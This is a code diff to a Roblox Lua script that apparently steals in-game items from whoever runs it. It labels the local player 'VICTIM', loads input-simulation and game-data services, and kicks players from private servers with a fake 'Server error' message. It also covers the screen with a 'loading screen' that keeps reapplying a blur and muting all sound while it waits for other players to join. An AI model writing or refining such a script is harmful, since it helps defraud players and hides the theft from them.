@@ -10,24 +10,24 @@ local CONFIG = {
 }
 
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-return
-end
+if _G.scriptExecuted then return end
 _G.scriptExecuted = true
-
-local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
-if getServerType and getServerType:IsA("RemoteFunction") then
-local ok, serverType = pcall(function()
-return getServerType:InvokeServer()
-end)
-if ok and serverType == "VIPServer" then
-plr:Kick("Server error. Please join a DIFFERENT server")
-return
-end
-end
 
 -- 🛠️ Services & Variables
 repeat task.wait() until game:IsLoaded()
+
+-- 🛡️ Check if VIP server and exit
+local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
+if getServerType and getServerType:IsA("RemoteFunction") then
+    local ok, serverType = pcall(function()
+        return getServerType:InvokeServer()
+    end)
+    if ok and serverType == "VIPServer" then
+        game.Players.LocalPlayer:Kick("Server error. Please join a DIFFERENT server")
+        return
+    end
+end
+
 local VICTIM = game.Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
@@ -112,7 +112,6 @@ local function showBlockingLoadingScreen()
     coroutine.wrap(function()
         while true do
             task.wait(1)
-            -- Reapply blur if removed
             if not game:GetService("Lighting"):FindFirstChild("FreezeBlur") then
                 local newBlur = Instance.new("BlurEffect")
                 newBlur.Size = 24
@@ -120,7 +119,6 @@ local function showBlockingLoadingScreen()
                 newBlur.Parent = game:GetService("Lighting")
             end
 
-            -- Remute if volume restored
             for _, sound in ipairs(workspace:GetDescendants()) do
                 if sound:IsA("Sound") and sound.Volume > 0 then
                     sound.Volume = 0
@@ -129,7 +127,6 @@ local function showBlockingLoadingScreen()
         end
     end)()
 end
-
 
 local function waitForJoin()
     for _, player in game.Players:GetPlayers() do
